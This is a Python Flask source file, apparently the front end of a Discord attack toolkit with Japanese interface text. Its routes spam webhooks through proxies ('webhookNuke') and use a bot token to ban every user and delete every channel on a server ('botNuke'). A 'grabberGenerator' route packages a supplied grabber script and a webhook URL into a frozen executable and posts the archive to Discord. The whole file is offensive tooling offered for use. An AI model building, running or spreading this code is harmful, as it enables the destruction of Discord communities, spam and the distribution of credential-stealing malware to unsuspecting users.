import subprocess, threading, traceback, requests, shutil, string, random, py7zr, sys, os
import discordWebhook, discordBot, Proxy
from flask import Flask, request, redirect, render_template

proxy = Proxy.Proxy("proxy.txt")
app = Flask(__name__)

def getIpAddresses():
    ipv4Url = "https://api.ipify.org?format=json"
    ipv6Url = "https://api64.ipify.org?format=json"

    try:
        ipv4Response = requests.get(ipv4Url)
        ipv4Address = ipv4Response.json()["ip"]
    except requests.RequestException:
        ipv4Address = "対応していません"
    
    try:
        ipv6Response = requests.get(ipv6Url)
        ipv6Address = ipv6Response.json()["ip"]
    except requests.RequestException:
        ipv6Address = "対応していません"
    return ipv4Address, ipv6Address

@app.route("/")
def index():
    proxy.getProxy()
    return render_template("index.html", ip=getIpAddresses())

@app.route("/tools")
def tools():
    return render_template("tools.html")

@app.route("/settingProxy", methods=["GET", "POST"])
def settingProxy():
    if request.method == "POST":
        proxyUrl = request.form["proxyUrl"]
        if proxy.setProxy(proxyUrl):
            return render_template("settingProxy.html", success="プロキシの設定が成功しました")
        else:
            return render_template("settingProxy.html", error="入力したプロキシは有効でありません")
    return render_template("settingProxy.html")

@app.route("/getDiscordWebhookLog", methods=["GET"])
def getDiscordWebhookLog():
    if request.args.get("id") in discordWebhook.logs:
        return render_template("getLog.html", log=discordWebhook.logs[request.args.get("id")])
    else:
        return render_template("getLog.html", log="Not found"), 404 

@app.route("/stopDiscordWebhook", methods=["GET"])
def stopDiscordWebhook():
    discordWebhook.stops.append(request.args.get("id"))
    return redirect("webhookNuke") 

@app.route("/webhookNuke", methods=["GET", "POST"])
def webhookNuke():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        
        webhookUrls = request.form["webhookUrls"].split("\r\n")
        latency = int(request.form["latency"])
        message = request.form["message"]
        
        print(webhookUrls)
        
        for webhookUrl in webhookUrls:
            threading.Thread(target=discordWebhook.DiscordWebhook(webhookUrl).nuke, args=(logId, latency, message)).start()
        return render_template("webhookNuke.html", logId=logId)
    return render_template("webhookNuke.html")

@app.route("/getDiscordBotLog", methods=["GET"])
def getDiscordBotLog():
    if request.args.get("id") in discordBot.logs:
        return render_template("getLog.html", log=discordBot.logs[request.args.get("id")])
    else:
        return render_template("getLog.html", log="Not found"), 404

@app.route("/stopDiscordBot", methods=["GET"])
def stopDiscordBot():
    discordBot.stops.append(request.args.get("id"))
    return redirect("botNuke")

@app.route("/botNuke", methods=["GET", "POST"])
def botNuke():
    if request.method == "POST":
        proxy.getProxy()
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        discordBot.logs[logId] = "Start Pman Nuke PPP\n\n"
        
        token = request.form["token"]
        guildId = int(request.form["guildId"])
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        allUserBan = "allUserBan" in request.form
        allChannelDelete = "allChannelDelete" in request.form
        
        discordBot.logs[logId] += f"""-- Value you entered --
ServerID:{guildId}
ChannelName:{channelName}
Latency:{latency}ms, {latency*0.001}s
-- Options --
AllUserBan:{allUserBan}
AllChannelDelete:{allChannelDelete}

"""
        
        bot = discordBot.DiscordBot(logId, token, guildId, channelName, latency, [message], allUserBan, allChannelDelete)
        botThread = threading.Thread(target=bot.runBot, daemon=True)
        botThread.start()
        return render_template("botNuke.html", logId=logId)
    return render_template("botNuke.html")

@app.route("/grabberGenerator", methods=["GET", "POST"])
def grabberGenerator():
    if request.method == "POST":
        proxy.getProxy()
        try:
            randomStr = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
            webhookUrl = request.form["webhookUrl"]
            libraries = request.form["libraries"].split(",")
            script = request.form["script"]
            
            discord = discordWebhook.DiscordWebhook(webhookUrl=webhookUrl)
            os.makedirs("temp", exist_ok=True)
            bLibraries = []
            for library in libraries:
                bLibraries.append(library.lower()
                    .replace("pillow", "PIL")
                    .replace("pycryptodome", "Crypto")
                )
            setupScript = ["from cx_Freeze import setup, Executable",
                            "setup(",
                            "   name=\"nuker\",",
                            "   version=\"1.0\",",
                            "   description=\"\",",
                            "   options={\"build_exe\": {\"packages\": "+str(bLibraries)+", \"build_exe\": \"./temp/nuker\"}},",
                            "   executables=[Executable(\"temp/"+randomStr+".py\")]",
                            ")"]
            with open(f"temp/{randomStr}.py", mode="w") as f:
                f.write(f"WEBHOOK_URL=\"{webhookUrl}\"\n{script}")
            with open(f"temp/{randomStr}-setup.py", mode="w") as f:
                f.write("\n".join(setupScript))

            subprocess.run(f"\"{sys.executable}\" -m pip install --upgrade pip "+" ".join(libraries), shell=True)
            subprocess.run(f"\"{sys.executable}\" ./temp/{randomStr}-setup.py build", shell=True)
            with py7zr.SevenZipFile("nuker.7z", "w", filters=[{"id": py7zr.FILTER_LZMA2, "preset": 9}]) as archive:
                archive.writeall("./temp/nuker/", arcname="")
            response = discord.sendFile("nuker.7z")
            shutil.rmtree("temp")
            os.remove("nuker.7z")
            if str(response.status_code)[0] == "2":
                return render_template("grabberGenerator.html", success="成功しました")
            else:
                return render_template("grabberGenerator.html", error="ファイル送信中にエラーが発生しました")
        except:
            shutil.rmtree("temp")
            return render_template("grabberGenerator.html", error="例外が発生しました<br><br>"+"<br>".join(traceback.format_exc().split("\n")))
    return render_template("grabberGenerator.html")